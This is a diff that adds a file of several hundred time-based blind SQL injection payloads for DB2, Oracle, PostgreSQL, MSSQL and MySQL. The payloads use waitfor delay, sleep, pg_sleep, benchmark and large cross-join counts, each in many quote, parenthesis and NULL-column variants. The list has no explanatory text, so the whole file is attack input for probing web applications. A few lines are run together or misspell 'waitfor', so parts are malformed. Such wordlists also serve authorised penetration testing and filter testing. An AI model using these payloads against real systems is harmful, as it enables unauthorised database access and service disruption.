@@ -1,0 +1,360 @@
+' || (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) || '
+\' ||  (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) || \'
+" || (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3) || "
+1 +  (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
++  (SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)
++ select(count( benchmark(10000000,MD5(1)) ))
+1 + select(count( benchmark(10000000,MD5(1)) ))
+' || (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) || '
+\' ||  (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) || \'
+" || (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) || "
+1 +  (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
++  (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
+' || (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) || '
+\' || (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) || \'
+" || (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) || "
+1 + (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))
++ (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))
+' || (SELECT COUNT(*) FROM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) || '
+\' || (SELECT COUNT(*) FROM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) || \'
+" || (SELECT COUNT(*) FROM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) || "
+1 + (SELECT COUNT(*) FROM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
++ (SELECT COUNT(*) FROM sysusers AS sys1,sysusers as sys2,sysusers as sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+)%20waitfor%20delay%20'0:0:20'%20/*
+)%20waitfor%20delay%20'0:0:20'%20--
+')%20waitfor%20delay%20'0:0:20'%20/*
+')%20waitfor%20delay%20'0:0:20'%20--
+")%20waitfor%20delay%20'0:0:20'%20/*
+")%20waitfor%20delay%20'0:0:20'%20--
+))%20waitfor%20delay%20'0:0:20'%20/*
+))%20waitfor%20delay%20'0:0:20'%20--
+'))%20waitfor%20delay%20'0:0:20'%20/*
+'))%20waitfor%20delay%20'0:0:20'%20--
+"))%20waitfor%20delay%20'0:0:20'%20/*
+"))%20waitfor%20delay%20'0:0:20'%20--
+,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL)%20waifor%20delay%20'0:0:20'%20/*
+',NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL)%20waifor%20delay%20'0:0:20'%20/*
+'),NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20-- waitfor delay '0:0:20' /* 
+ waitfor delay '0:0:20' --
+' waitfor delay '0:0:20' /* 
+' waitfor delay '0:0:20' --
+" waitfor delay '0:0:20' /* 
+" waitfor delay '0:0:20' --
+) waitfor delay '0:0:20' /* 
+) waitfor delay '0:0:20' --
+)) waitfor delay '0:0:20' /* 
+)) waitfor delay '0:0:20' --
+))) waitfor delay '0:0:20' /* 
+))) waitfor delay '0:0:20' --
+)))) waitfor delay '0:0:20' /* 
+)))) waitfor delay '0:0:20' --
+))))) waitfor delay '0:0:20' --
+)))))) waitfor delay '0:0:20' --
+') waitfor delay '0:0:20' /* 
+') waitfor delay '0:0:20' --
+") waitfor delay '0:0:20' /* 
+") waitfor delay '0:0:20' --
+')) waitfor delay '0:0:20' /* 
+')) waitfor delay '0:0:20' --
+")) waitfor delay '0:0:20' /* 
+")) waitfor delay '0:0:20' --
+'))) waitfor delay '0:0:20' /* 
+'))) waitfor delay '0:0:20' --
+"))) waitfor delay '0:0:20' /* 
+"))) waitfor delay '0:0:20' --
+')))) waitfor delay '0:0:20' /* 
+')))) waitfor delay '0:0:20' --
+")))) waitfor delay '0:0:20' /* 
+")))) waitfor delay '0:0:20' --
+'))))) waitfor delay '0:0:20' /* 
+'))))) waitfor delay '0:0:20' --
+"))))) waitfor delay '0:0:20' /* 
+"))))) waitfor delay '0:0:20' --
+')))))) waitfor delay '0:0:20' /* 
+')))))) waitfor delay '0:0:20' --
+")))))) waitfor delay '0:0:20' /* 
+")))))) waitfor delay '0:0:20' --+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
++if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+'),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+"),(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+ and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+sleep(10)#
+1 or sleep(10)#
+" or sleep(10)#
+' or sleep(10)#
+" or sleep(10)="
+' or sleep(10)='
+1) or sleep(10)#
+") or sleep(10)="
+') or sleep(10)='
+1)) or sleep(10)#
+")) or sleep(10)="
+')) or sleep(10)='
+;waitfor delay '0:0:10'--
+);waitfor delay '0:0:10'--
+';waitfor delay '0:0:10'--
+";waitfor delay '0:0:10'--
+');waitfor delay '0:0:10'--
+");waitfor delay '0:0:10'--
+));waitfor delay '0:0:10'--
+'));waitfor delay '0:0:10'--
+"));waitfor delay '0:0:10'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+pg_sleep(10)--
+1 or pg_sleep(10)--
+" or pg_sleep(10)--
+' or pg_sleep(10)--
+1) or pg_sleep(10)--
+") or pg_sleep(10)--
+') or pg_sleep(10)--
+1)) or pg_sleep(10)--
+")) or pg_sleep(10)--
+')) or pg_sleep(10)--
